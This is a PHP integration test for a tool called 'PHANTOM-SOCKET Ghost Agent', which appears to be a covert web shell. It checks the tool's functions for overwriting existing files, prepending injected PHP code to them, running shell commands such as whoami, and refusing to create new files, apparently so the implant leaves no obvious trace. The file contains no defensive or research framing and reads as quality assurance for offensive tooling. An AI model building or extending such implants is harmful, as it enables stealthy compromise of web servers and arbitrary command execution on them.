<?php
/**
 * PHANTOM-SOCKET V3.1 — GHOST AGENT INTEGRATION TEST
 */

require_once __DIR__ . '/../deploy/ghost-agent.php';

echo "[-] Starting Integration Test for Ghost Agent...\n";

// 1. Test: Zero File Drop (Write to non-existent file should fail)
echo "[ ] Testing Zero File Drop Guard... ";
$res = ghost_overwrite_file('non_existent.php', base64_encode('test'));
if (strpos($res, 'ERROR: NO_FILE_DROP') !== false) {
    echo "PASS\n";
} else {
    echo "FAIL: $res\n";
}

// 2. Test: Overwrite Existing File
$test_file = __DIR__ . '/test_target.php';
file_put_contents($test_file, "<?php // original ?>");
echo "[ ] Testing Overwrite Existing File... ";
$new_content = "<?php // overwritten ?>";
$res = ghost_overwrite_file($test_file, base64_encode($new_content));
if (strpos($res, 'SUCCESS') !== false && file_get_contents($test_file) === $new_content) {
    echo "PASS\n";
} else {
    echo "FAIL: $res\n";
}

// 3. Test: PHP Injection (Prepend)
echo "[ ] Testing PHP Injection (Prepend)... ";
$payload = "<?php // ghost ?>";
$res = ghost_inject_php($test_file, base64_encode($payload), 'prepend');
$current = file_get_contents($test_file);
if (strpos($res, 'SUCCESS') !== false && strpos($current, $payload) === 0) {
    echo "PASS\n";
} else {
    echo "FAIL: $res\n";
}

// 4. Test: Command Execution (ob_start capture)
echo "[ ] Testing Command Execution (whoami)... ";
$out = ghost_exec('whoami');
if (!empty($out)) {
    echo "PASS (" . trim($out) . ")\n";
} else {
    echo "FAIL: No output\n";
}

// Cleanup
@unlink($test_file);
echo "[+] All tests completed.\n";
